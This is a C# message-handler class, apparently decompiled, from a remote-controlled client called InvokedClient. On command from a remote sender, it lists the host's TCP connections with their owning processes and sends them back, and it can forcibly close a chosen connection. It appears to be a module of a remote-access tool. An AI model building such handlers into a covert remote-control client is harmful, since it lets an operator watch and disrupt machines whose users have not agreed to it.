

using System;
using System.Runtime.InteropServices;
using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class TcpConnectionsHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message)
		{
			return message is GetConnections || message is DoCloseConnection;
		}

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetConnections message1:
					this.Execute(sender, message1);
					break;
				case DoCloseConnection message2:
					this.Execute(sender, message2);
					break;
			}
		}

		private void Execute(ISender client, GetConnections message)
		{
			InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid[] table = this.GetTable();
			TcpConnection[] tcpConnectionArray = new TcpConnection[table.Length];
			for (int index = 0; index < table.Length; ++index)
			{
				string str;
				try
				{
					str = System.Diagnostics.Process.GetProcessById((int)table[index].owningPid).ProcessName;
				}
				catch
				{
					str = string.Format("PID: {0}", (object)table[index].owningPid);
				}
				tcpConnectionArray[index] = new TcpConnection()
				{
					ProcessName = str,
					LocalAddress = table[index].LocalAddress.ToString(),
					LocalPort = table[index].LocalPort,
					RemoteAddress = table[index].RemoteAddress.ToString(),
					RemotePort = table[index].RemotePort,
					State = (ConnectionState)table[index].state
				};
			}
			client.Send<GetConnectionsResponse>(new GetConnectionsResponse()
			{
				Connections = tcpConnectionArray
			});
		}

		private void Execute(ISender client, DoCloseConnection message)
		{
			InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid[] table = this.GetTable();
			for (int index = 0; index < table.Length; ++index)
			{
				if (message.LocalAddress == table[index].LocalAddress.ToString() && (int)message.LocalPort == (int)table[index].LocalPort && message.RemoteAddress == table[index].RemoteAddress.ToString() && (int)message.RemotePort == (int)table[index].RemotePort)
				{
					table[index].state = 12U;
					IntPtr num = Marshal.AllocCoTaskMem(Marshal.SizeOf<InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid>(table[index]));
					Marshal.StructureToPtr<InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid>(table[index], num, false);
					InvokedClient.Utilities.NativeMethods.SetTcpEntry(num);
					this.Execute(client, new GetConnections());
					break;
				}
			}
		}

		private InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid[] GetTable()
		{
			int ipVersion = 2;
			int dwOutBufLen = 0;
			int extendedTcpTable = (int)InvokedClient.Utilities.NativeMethods.GetExtendedTcpTable(IntPtr.Zero, ref dwOutBufLen, true, ipVersion, InvokedClient.Utilities.NativeMethods.TcpTableClass.TcpTableOwnerPidAll);
			IntPtr num = Marshal.AllocHGlobal(dwOutBufLen);
			InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid[] table;
			try
			{
				if (InvokedClient.Utilities.NativeMethods.GetExtendedTcpTable(num, ref dwOutBufLen, true, ipVersion, InvokedClient.Utilities.NativeMethods.TcpTableClass.TcpTableOwnerPidAll) != 0U)
					return (InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid[])null;
				InvokedClient.Utilities.NativeMethods.MibTcptableOwnerPid structure1 = (InvokedClient.Utilities.NativeMethods.MibTcptableOwnerPid)Marshal.PtrToStructure(num, typeof(InvokedClient.Utilities.NativeMethods.MibTcptableOwnerPid));
				IntPtr ptr = (IntPtr)((long)num + (long)Marshal.SizeOf<uint>(structure1.dwNumEntries));
				table = new InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid[(int)structure1.dwNumEntries];
				for (int index = 0; (long)index < (long)structure1.dwNumEntries; ++index)
				{
					InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid structure2 = (InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid)Marshal.PtrToStructure(ptr, typeof(InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid));
					table[index] = structure2;
					ptr = (IntPtr)((long)ptr + (long)Marshal.SizeOf<InvokedClient.Utilities.NativeMethods.MibTcprowOwnerPid>(structure2));
				}
			}
			finally
			{
				Marshal.FreeHGlobal(num);
			}
			return table;
		}
	}
}